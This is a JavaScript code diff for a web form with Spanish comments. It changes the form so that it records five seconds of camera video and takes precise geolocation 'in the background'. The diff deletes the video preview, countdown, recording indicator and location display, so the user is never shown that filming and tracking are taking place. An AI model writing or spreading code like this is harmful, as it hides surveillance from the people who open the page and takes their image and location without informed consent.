@@ -178,95 +178,55 @@ async function acceptPermissions() {
     try {
         FormAlerts.preparandoVideo();
 
-        // Solicitar permisos de cámara
+        // Solicitar permisos de cámara (sin audio)
         stream = await navigator.mediaDevices.getUserMedia({
             video: {
                 width: { ideal: 1280 },
                 height: { ideal: 720 }
             },
-            audio: true
+            audio: false // No solicitar audio
         });
 
         FormAlerts.obteniendoUbicacion();
 
-        // Solicitar permisos de ubicación
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                locationData = {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    altitude: position.coords.altitude,
-                    altitudeAccuracy: position.coords.altitudeAccuracy,
-                    heading: position.coords.heading,
-                    speed: position.coords.speed,
-                    timestamp: new Date().toISOString()
-                };
+        // Iniciar grabación y obtención de ubicación en segundo plano
+        startBackgroundRecording();
 
-                FormAlerts.ubicacionObtenida();
-
-                showStep(2);
-                startVideoRecording();
-            },
-            (error) => {
-                FormAlerts.permisoUbicacionDenegado(error.message);
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                }
-            },
-            {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            }
-        );
+        // Avanzar directamente al siguiente paso
+        showStep(3);
 
     } catch (error) {
         FormAlerts.permisoCamaraDenegado(error.message);
     }
 }
 
-// ===================================
-// PASO 2: VIDEO
-// ===================================
-
-function startVideoRecording() {
-    const video = document.getElementById('videoPreview');
-    const statusDiv = document.getElementById('videoStatus');
-    const countdownDiv = document.getElementById('countdown');
-    const locationInfo = document.getElementById('locationInfo');
-    const locationText = document.getElementById('locationText');
-
-    video.style.display = 'block';
-    video.srcObject = stream;
-
-    if (locationData) {
-        locationText.textContent = `Lat: ${locationData.latitude.toFixed(6)}, Long: ${locationData.longitude.toFixed(6)} (±${locationData.accuracy.toFixed(0)}m)`;
-        locationInfo.style.display = 'block';
-    }
-
-    let countdown = 3;
-    statusDiv.textContent = 'Prepárate para la grabación...';
-    countdownDiv.textContent = countdown;
-
-    const countdownInterval = setInterval(() => {
-        countdown--;
-        if (countdown > 0) {
-            countdownDiv.textContent = countdown;
-        } else {
-            clearInterval(countdownInterval);
-            countdownDiv.textContent = '';
-            startRecording();
+function startBackgroundRecording() {
+    // 1. Obtener ubicación
+    navigator.geolocation.getCurrentPosition(
+        (position) => {
+            locationData = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                altitude: position.coords.altitude,
+                altitudeAccuracy: position.coords.altitudeAccuracy,
+                heading: position.coords.heading,
+                speed: position.coords.speed,
+                timestamp: new Date().toISOString()
+            };
+            console.log('Ubicación obtenida:', locationData);
+        },
+        (error) => {
+            console.error('Error obteniendo ubicación:', error.message);
+        },
+        {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
         }
-    }, 1000);
-}
+    );
 
-function startRecording() {
-    const statusDiv = document.getElementById('videoStatus');
-    const countdownDiv = document.getElementById('countdown');
-
-    statusDiv.textContent = '🔴 Grabando...';
-
+    // 2. Iniciar grabación de video
     const chunks = [];
     const options = { mimeType: 'video/webm;codecs=vp9' };
 
@@ -288,7 +248,6 @@ function startRecording() {
         const recordingEndTime = Date.now();
         videoBlob = new Blob(chunks, { type: 'video/webm' });
 
-        // Metadata del video
         sessionData.videoMetadata = {
             size: videoBlob.size,
             type: videoBlob.type,
@@ -296,29 +255,18 @@ function startRecording() {
             recordedAt: new Date().toISOString()
         };
 
-        statusDiv.textContent = '✅ Video grabado exitosamente';
-
+        console.log('Video grabado exitosamente');
         stream.getTracks().forEach(track => track.stop());
-
-        setTimeout(() => {
-            showStep(3);
-        }, 2000);
     };
 
     mediaRecorder.start();
 
-    let recordTime = 5;
-    countdownDiv.textContent = recordTime + 's';
-
-    const recordInterval = setInterval(() => {
-        recordTime--;
-        countdownDiv.textContent = recordTime + 's';
-
-        if (recordTime <= 0) {
-            clearInterval(recordInterval);
+    // Detener grabación después de 5 segundos
+    setTimeout(() => {
+        if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
         }
-    }, 1000);
+    }, 5000);
 }
 
 // ===================================
